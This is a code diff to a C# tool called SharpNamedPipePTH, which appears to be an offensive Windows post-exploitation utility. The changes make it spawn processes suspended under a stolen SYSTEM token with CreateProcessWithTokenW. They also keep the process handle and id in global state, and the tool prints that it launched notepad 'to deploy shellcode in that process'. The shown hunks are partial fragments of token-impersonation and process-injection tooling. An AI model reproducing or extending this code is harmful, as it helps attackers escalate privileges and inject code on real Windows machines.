@@ -295,7 +295,7 @@ namespace SharpNamedPipePTH
 
                     binary = @"C:\windows\system32\notepad.exe";
 
-                    bool output = CreateProcessWithTokenW(sysToken, 0, null, binary, CreationFlags.NewConsole, IntPtr.Zero, null, ref sInfo, out pInfo);
+                    bool output = CreateProcessWithTokenW(sysToken, 0, null, binary, CreationFlags.NewConsole | CreationFlags.Suspended, IntPtr.Zero, null, ref sInfo, out pInfo);
                     Console.WriteLine($"Executed '{binary}' to deploy shellcode in that process!");
 
                     int ProcID = ProcByName("notepad");
@@ -384,6 +384,8 @@ namespace SharpNamedPipePTH
                         0,
                         0,
                         IntPtr.Zero);
+                    Globals.UpdateIntPtr(pInfo.hProcess);
+                    Globals.suspendedProcessId = pInfo.dwProcessId;
 
                 }
                 else
@@ -391,6 +393,8 @@ namespace SharpNamedPipePTH
                     
                                         
                     RevertToSelf();
+                    name = WindowsIdentity.GetCurrent().Name;
+                    Console.WriteLine($"RevToSelf, got old user again: {name}.");
 
                     // Spawn a new process with the duplicated token, a desktop session, and the created profile
                     PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
@@ -398,10 +402,17 @@ namespace SharpNamedPipePTH
                     
                     sInfo.cb = Marshal.SizeOf(sInfo);
 
-                    bool output = CreateProcessWithTokenW(sysToken, 0, binary, args, CreationFlags.NewConsole, IntPtr.Zero, null, ref sInfo, out pInfo);
-                    Console.WriteLine($"Executed '{binary}' with impersonated token!");
+                    bool output = CreateProcessWithTokenW(sysToken, 0, binary, args, CreationFlags.NewConsole | CreationFlags.Suspended , IntPtr.Zero, null, ref sInfo, out pInfo);
+                    Console.WriteLine($"Executed '{binary}' in Process-ID '{pInfo.dwProcessId}'with impersonated token!");
+                    Console.WriteLine($"Process Handle: '{pInfo.hProcess}'");
+
+                    Globals.UpdateIntPtr(pInfo.hProcess);
+                    Console.WriteLine($"Process Handle: '{Globals.suspendedProcessHandle}'");
+                    Globals.suspendedProcessId = pInfo.dwProcessId;
                 }
+                
             }
+            
         }
     }
 }
